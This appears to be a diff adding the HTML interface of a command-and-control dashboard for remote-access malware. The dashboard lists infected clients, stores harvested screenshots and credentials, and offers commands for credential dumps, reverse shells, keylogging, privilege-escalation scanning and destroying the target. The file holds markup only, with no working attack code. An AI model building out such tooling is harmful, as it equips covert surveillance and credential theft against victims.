@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>C2 Dashboard - Control Panel</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+</head>
+<body>
+    <div class="container">
+        <aside class="sidebar">
+            <div class="sidebar-header">
+                <h2><i class="fas fa-terminal"></i> C2 Server</h2>
+            </div>
+            <div class="client-list-container">
+                <h3>Active Clients</h3>
+                <ul id="client-list">
+                </ul>
+            </div>
+            <div class="sidebar-footer">
+                <button id="refresh-clients"><i class="fas fa-sync-alt"></i> Refresh</button>
+                <button id="open-album" class="album-btn"><i class="fas fa-images"></i> Album <span id="album-count" class="badge">0</span></button>
+                <button id="open-creds" class="creds-btn"><i class="fas fa-key"></i>Credentials</button>
+            </div>
+        </aside>
+
+    <!-- Modal Album -->
+    <div id="album-modal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2><i class="fas fa-images"></i> Album Screenshots</h2>
+                <button class="close-modal">&times;</button>
+            </div>
+            <div class="modal-body">
+                <div id="screenshots-grid" class="screenshots-grid">
+                    <p class="empty-msg">Aucun screenshot disponible</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Credentials Library Modal -->
+    <div id="creds-modal" class="modal">
+        <div class="modal-content creds-modal-content">
+            <div class="modal-header">
+                <h2><i class="fas fa-key"></i> Credentials Library</h2>
+                <button class="close-modal">&times;</button>
+            </div>
+            <div class="creds-tabs">
+                <button class="creds-tab-btn active" data-tab="session">
+                    <i class="fas fa-database"></i> Session
+                </button>
+                <button class="creds-tab-btn" data-tab="navigator">
+                    <i class="fas fa-globe"></i> Browser
+                </button>
+            </div>
+            <div class="modal-body creds-modal-body">
+                <!-- Session Tab -->
+                <div id="creds-tab-session" class="creds-tab-content active">
+                    <div class="creds-col-devices">
+                        <h3><i class="fas fa-desktop"></i> Device</h3>
+                        <div id="creds-devices-list" class="creds-devices-list">
+                            <p class="empty-msg">Aucun device.</p>
+                        </div>
+                    </div>
+                    <div class="creds-col-dates">
+                        <h3><i class="fas fa-calendar-alt"></i> Date / time</h3>
+                        <div id="creds-dates-list" class="creds-dates-list">
+                            <p class="empty-msg">Select a device.</p>
+                        </div>
+                    </div>
+                    <div class="creds-col-detail">
+                        <div id="creds-couple-detail" class="creds-couple-detail">
+                            <p class="empty-msg">Select a device then a date on the left.</p>
+                        </div>
+                    </div>
+                </div>
+                <!-- Browser Tab -->
+                <div id="creds-tab-navigator" class="creds-tab-content">
+                    <div class="creds-navigator-container">
+                        <div id="creds-navigator-list" class="creds-navigator-list">
+                            <p class="empty-msg">Loading...</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal Image Fullscreen -->
+    <div id="image-modal" class="modal">
+        <div class="modal-content image-modal-content">
+            <div class="modal-header">
+                <h2 id="image-title">Screenshot</h2>
+                <button class="close-modal">&times;</button>
+            </div>
+            <div class="modal-body image-modal-body">
+                <img id="fullscreen-image" src="" alt="Screenshot">
+            </div>
+            <div class="modal-footer">
+                <button id="delete-screenshot" class="delete-btn"><i class="fas fa-trash"></i> Delete</button>
+            </div>
+        </div>
+    </div>
+
+        <main class="main-content">
+            <header>
+                <h1 id="current-client-title">Select a client</h1>
+            </header>
+            <section class="command-section">
+                <div class="command-header">
+                    <h3><i class="fas fa-terminal"></i> Send instruction</h3>
+                </div>
+                <div id="command-form">
+                    <div class="service-selector-wrapper">
+                        <label for="selected-service" class="form-label">
+                            <i class="fas fa-cog"></i> Service
+                        </label>
+                        <div class="dropdown-wrapper">
+                            <button type="button" id="selected-service" class="service-button">
+                                <span class="service-text">Select a service</span>
+                                <i class="fas fa-chevron-down"></i>
+                            </button>
+                            <ul class="dropdown-content" id="service-dropdown">
+                                <li><a href="#" data-command="CMD"><i class="fas fa-terminal"></i> Bash command</a></li>
+                                <li><a href="#" data-command="CREDS"><i class="fas fa-key"></i> Credentials dump</a></li>
+                                <li><a href="#" data-command="SHELL"><i class="fas fa-network-wired"></i> Reverse shell</a></li>
+                                <li><a href="#" data-command="KEYLOG"><i class="fas fa-keyboard"></i> Keylogger</a></li>
+                                <li><a href="#" data-command="SCREENSHOT"><i class="fas fa-camera"></i> Screenshot</a></li>
+                                <li><a href="#" data-command="PRIVESC"><i class="fas fa-shield-alt"></i> Privesc scanner</a></li>
+                                <li><a href="#" data-command="EXIT"><i class="fas fa-sign-out-alt"></i> Exit</a></li>
+                                <li><a href="#" data-command="DESTROY"><i class="fas fa-skull"></i> Destroy</a></li>
+                            </ul>
+                        </div>
+                    </div>
+                    <div class="command-input-wrapper">
+                        <label for="command-input" class="form-label">
+                            <i class="fas fa-code"></i> Parameters
+                        </label>
+                        <div id="dynamic-input-container">
+                            <input 
+                                type="text" 
+                                id="command-input" 
+                                placeholder="Enter command parameters..."
+                                autocomplete="off"
+                            >
+                        </div>
+                    </div>
+                    <div class="send-button-wrapper">
+                        <button type="button" id="send-btn" class="send-button">
+                            <i class="fas fa-paper-plane"></i>
+                            <span>Send</span>
+                        </button>
+                    </div>
+                </div>
+            </section>
+
+            <section class="console-section">
+                <div class="console-header">
+                    <span><i class="fas fa-file-alt"></i> Logs / Output</span>
+                </div>
+                <div id="console-output" class="console-body">
+                    <p class="empty-msg">No client selected</p>
+                </div>
+            </section>
+        </main>
+    </div>
+    <script src="main.js"></script>
+</body>
+</html>
+
